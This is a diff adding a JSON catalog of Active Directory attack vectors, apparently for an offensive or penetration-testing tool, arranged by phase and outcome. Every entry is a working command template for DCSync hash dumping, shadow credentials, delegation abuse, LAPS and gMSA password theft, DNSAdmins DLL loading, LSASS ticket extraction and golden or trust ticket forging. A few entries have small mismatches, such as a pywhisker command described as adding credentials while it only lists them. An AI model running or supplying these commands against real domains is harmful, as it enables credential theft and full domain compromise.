@@ -1,0 +1,324 @@
+{
+  "service": "active-directory",
+  "description": "Active Directory enumeration, ACL abuse, delegation attacks, and trust relationships",
+  "ports": [389, 636, 3268, 3269],
+  "serviceNames": ["ldap", "ldaps", "gc"],
+  "targetOs": ["windows"],
+  "vectors": [
+    {
+      "id": "ad-acl-dcsync",
+      "name": "DCSync via ACL Permissions",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Abuse DCSync permissions (Administrators, Domain Admins, Enterprise Admins, or accounts with replication rights) to dump domain credentials",
+      "commands": [
+        {
+          "tool": "mimikatz",
+          "command": "lsadump::dcsync /domain:<target_domain> /user:<target_domain>\\administrator",
+          "description": "Perform DCSync to extract password hashes"
+        },
+        {
+          "tool": "secretsdump.py",
+          "command": "secretsdump.py '<domain>'/'<user>':'<password>'@'<domain_controller>'",
+          "description": "Extract NTDS credentials via DCSync"
+        }
+      ],
+      "outcomes": ["domain_admin", "credential_access"]
+    },
+    {
+      "id": "ad-acl-shadow-credentials",
+      "name": "Shadow Credentials via msDS-KeyCredentialLink",
+      "phase": "credential_access",
+      "prerequisites": ["valid_credentials"],
+      "description": "Abuse GenericWrite or similar ACL permissions to add Key Credentials to target accounts (Shadow Credentials attack)",
+      "commands": [
+        {
+          "tool": "certipy",
+          "command": "certipy shadow auto '-u <user>@<domain>' -p <password> -account '<target_account>'",
+          "description": "Automated shadow credentials attack"
+        },
+        {
+          "tool": "pywhisker.py",
+          "command": "pywhisker.py -d \"FQDN_DOMAIN\" -u \"user1\" -p \"CERTIFICATE_PASSWORD\" --target \"TARGET_SAMNAME\" --action \"list\"",
+          "description": "Add key credentials to target account"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "ad-acl-group-membership",
+      "name": "Add Member to Group via ACL",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Abuse GenericAll/GenericWrite/Self permissions on groups to add members or escalate privileges",
+      "commands": [
+        {
+          "tool": "net",
+          "command": "net group \"<group_name>\" <username> /add /domain",
+          "description": "Add user to privileged group"
+        }
+      ],
+      "outcomes": ["privilege_escalation"]
+    },
+    {
+      "id": "ad-acl-password-change",
+      "name": "Force Password Change via ACL",
+      "phase": "credential_access",
+      "prerequisites": ["valid_credentials"],
+      "description": "Abuse GenericAll/GenericWrite/ForceChangePassword permissions to change target user passwords",
+      "commands": [
+        {
+          "tool": "net",
+          "command": "net user <user> <new_password> /domain",
+          "description": "Change user password"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "ad-acl-computer-rbcd",
+      "name": "Resource-Based Constrained Delegation via Computer ACL",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Abuse GenericAll/GenericWrite on computer objects to configure msDs-AllowedToActOnBehalfOf for RBCD attacks",
+      "commands": [
+        {
+          "tool": "rbcd.py",
+          "command": "rbcd.py -delegate-from '<attacker_computer>$' -delegate-to '<target>$' -dc-ip '<dc>' -action 'write' <domain>/<user>:<password>",
+          "description": "Configure RBCD on target computer"
+        },
+        {
+          "tool": "getST.py",
+          "command": "getST.py -spn host/<target> '<domain>/<attacker_computer>$:<computer_pass>' -impersonate Administrator --dc-ip <dc_ip>",
+          "description": "Request service ticket as Administrator"
+        }
+      ],
+      "outcomes": ["privilege_escalation", "admin_access"]
+    },
+    {
+      "id": "ad-acl-targeted-kerberoasting",
+      "name": "Targeted Kerberoasting via SPN Modification",
+      "phase": "credential_access",
+      "prerequisites": ["valid_credentials"],
+      "description": "Abuse GenericAll/GenericWrite on user accounts to add SPN and perform targeted kerberoasting",
+      "commands": [
+        {
+          "tool": "targetedKerberoast.py",
+          "command": "targetedKerberoast.py -d <domain> -u <user> -p <pass>",
+          "description": "Add SPN to target user and extract TGS hash"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "ad-gmsa-password-read",
+      "name": "Read GMSA Passwords",
+      "phase": "credential_access",
+      "prerequisites": ["valid_credentials"],
+      "description": "Extract Group Managed Service Account passwords if user has ReadGMSAPassword permission",
+      "commands": [
+        {
+          "tool": "gMSADumper.py",
+          "command": "gMSADumper.py -u '<user>' -p '<password>' -d '<domain>'",
+          "description": "Dump GMSA passwords"
+        },
+        {
+          "tool": "nxc",
+          "command": "nxc ldap <ip> -u <user> -p <pass> --gmsa",
+          "description": "Extract GMSA passwords via NetExec"
+        },
+        {
+          "tool": "ldeep",
+          "command": "ldeep ldap -u <user> -p <password> -d <domain> -s ldaps://<dc_ip> gmsa",
+          "description": "Query GMSA passwords via LDAP"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "ad-laps-password-read",
+      "name": "Read LAPS Passwords",
+      "phase": "credential_access",
+      "prerequisites": ["valid_credentials"],
+      "description": "Extract Local Administrator Password Solution (LAPS) passwords for privileged local admin access",
+      "commands": [
+        {
+          "tool": "Get-LapsADPassword",
+          "command": "Get-LapsADPassword -DomainController <ip_dc> -Credential <domain>\\<login> | Format-Table -AutoSize",
+          "description": "Read LAPS passwords from AD"
+        },
+        {
+          "tool": "ldeep",
+          "command": "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> laps",
+          "description": "Extract LAPS passwords via LDAP"
+        },
+        {
+          "tool": "nxc",
+          "command": "nxc ldap <dc_ip> -d <domain> -u <user> -p <password> --module laps",
+          "description": "Extract LAPS passwords via NetExec"
+        }
+      ],
+      "outcomes": ["admin_access", "credential_access"]
+    },
+    {
+      "id": "ad-gpo-abuse",
+      "name": "GPO Modification Abuse",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Abuse write permissions on Group Policy Objects to achieve code execution or privilege escalation",
+      "commands": [
+        {
+          "tool": "Get-DomainObjectAcl",
+          "command": "Get-DomainObjectAcl -SearchBase \"CN=Policies,CN=System,DC=domain,DC=com\" -ResolveGUIDs | ? { $_.ObjectAceType -eq \"Group-Policy-Container\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl",
+          "description": "Find principals that can create GPOs"
+        },
+        {
+          "tool": "Get-DomainOU",
+          "command": "Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq \"GP-Link\" -and $_.ActiveDirectoryRights -match \"WriteProperty\" } | select ObjectDN, SecurityIdentifier | fl",
+          "description": "Find principals that can write GP-Link"
+        }
+      ],
+      "outcomes": ["privilege_escalation", "admin_access"]
+    },
+    {
+      "id": "ad-dnsadmin-abuse",
+      "name": "DNSAdmin Group Privilege Escalation",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials", "dnsadmin_membership"],
+      "description": "Abuse DNSadmins group membership (CVE-2021-40469) to load malicious DLL and achieve privilege escalation",
+      "commands": [
+        {
+          "tool": "dnscmd.exe",
+          "command": "dnscmd.exe /config /serverlevelplugindll <\\\\path\\to\\dll>",
+          "description": "Configure DNS server to load malicious plugin DLL"
+        },
+        {
+          "tool": "sc",
+          "command": "sc \\\\DNSServer stop dns && sc \\\\DNSServer start dns",
+          "description": "Restart DNS service to load DLL"
+        }
+      ],
+      "outcomes": ["admin_access", "privilege_escalation"]
+    },
+    {
+      "id": "ad-delegation-unconstrained",
+      "name": "Unconstrained Delegation Abuse",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials", "admin_access"],
+      "description": "Abuse unconstrained delegation by forcing connections and extracting TGTs from LSASS memory",
+      "commands": [
+        {
+          "tool": "findDelegation.py",
+          "command": "findDelegation.py \"<domain>\"/\"<user>\":\"<password>\"",
+          "description": "Find accounts with delegation configured"
+        },
+        {
+          "tool": "Rubeus.exe",
+          "command": "Rubeus.exe monitor /interval:5",
+          "description": "Monitor for incoming TGTs"
+        },
+        {
+          "tool": "mimikatz",
+          "command": "privilege::debug\nsekurlsa::tickets /export",
+          "description": "Extract TGTs from memory"
+        }
+      ],
+      "outcomes": ["credential_access", "privilege_escalation"]
+    },
+    {
+      "id": "ad-delegation-constrained-s4u",
+      "name": "Constrained Delegation with Protocol Transition",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Abuse constrained delegation with protocol transition (TRUSTED_TO_AUTH_FOR_DELEGATION) to impersonate users",
+      "commands": [
+        {
+          "tool": "Rubeus.exe",
+          "command": "Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<admin_user> /msdsspn:<spn_constrained> /altservice:<altservice> /ptt",
+          "description": "Perform S4U2Self and S4U2Proxy to get service ticket"
+        },
+        {
+          "tool": "getST.py",
+          "command": "getST.py -spn '<spn>/<target>' -impersonate Administrator -dc-ip '<dc_ip>' '<domain>/<user>:<password>' -altservice <altservice>",
+          "description": "Request service ticket via constrained delegation"
+        }
+      ],
+      "outcomes": ["privilege_escalation", "admin_access"]
+    },
+    {
+      "id": "ad-delegation-rbcd",
+      "name": "Resource-Based Constrained Delegation",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Configure and abuse Resource-Based Constrained Delegation by adding computer accounts",
+      "commands": [
+        {
+          "tool": "addcomputer.py",
+          "command": "addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>'",
+          "description": "Add computer account to domain"
+        },
+        {
+          "tool": "rbcd.py",
+          "command": "rbcd.py -delegate-from '<computer>$' -delegate-to '<target>$' -dc-ip '<dc>' -action 'write' <domain>/<user>:<password>",
+          "description": "Configure RBCD delegation"
+        },
+        {
+          "tool": "getST.py",
+          "command": "getST.py -spn host/<dc_fqdn> '<domain>/<computer_account>:<computer_pass>' -impersonate Administrator --dc-ip <dc_ip>",
+          "description": "Get service ticket as Administrator"
+        }
+      ],
+      "outcomes": ["privilege_escalation", "admin_access"]
+    },
+    {
+      "id": "ad-trust-child-parent",
+      "name": "Child to Parent Domain Trust Exploitation",
+      "phase": "privilege_escalation",
+      "prerequisites": ["domain_admin"],
+      "description": "Escalate from child domain to parent domain using trust key or Golden Ticket with SID history",
+      "commands": [
+        {
+          "tool": "mimikatz",
+          "command": "lsadump::trust /patch",
+          "description": "Extract trust key"
+        },
+        {
+          "tool": "mimikatz",
+          "command": "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /aes256:<trust_key_aes256> /sids:<target_domain_sid>-519 /service:krbtgt /target:<target_domain> /ptt",
+          "description": "Create inter-realm TGT with SID history"
+        },
+        {
+          "tool": "ticketer.py",
+          "command": "ticketer.py -nthash <trust_key> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 -spn krbtgt/<parent_domain> trustfakeuser",
+          "description": "Forge trust ticket with Enterprise Admins SID"
+        },
+        {
+          "tool": "raiseChild.py",
+          "command": "raiseChild.py <child_domain>/<user>:<password>",
+          "description": "Automated child to parent escalation"
+        }
+      ],
+      "outcomes": ["domain_admin", "privilege_escalation"]
+    },
+    {
+      "id": "ad-trust-external-sidhistory",
+      "name": "External Trust SID History Injection",
+      "phase": "privilege_escalation",
+      "prerequisites": ["domain_admin"],
+      "description": "Abuse SID History in external trusts by creating Golden or Trust tickets with extra SIDs",
+      "commands": [
+        {
+          "tool": "mimikatz",
+          "command": "kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID>-<GROUP_SID_SUP_1000> /ptt",
+          "description": "Create Golden Ticket with SID History"
+        },
+        {
+          "tool": "ticketer.py",
+          "command": "ticketer.py -nthash <trust_hash> -domain-sid <sid_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid sup 1000> -spn krbtgt/<domain_a> fakeuser",
+          "description": "Create trust ticket with extra SID"
+        }
+      ],
+      "outcomes": ["privilege_escalation"]
+    }
+  ]
+}
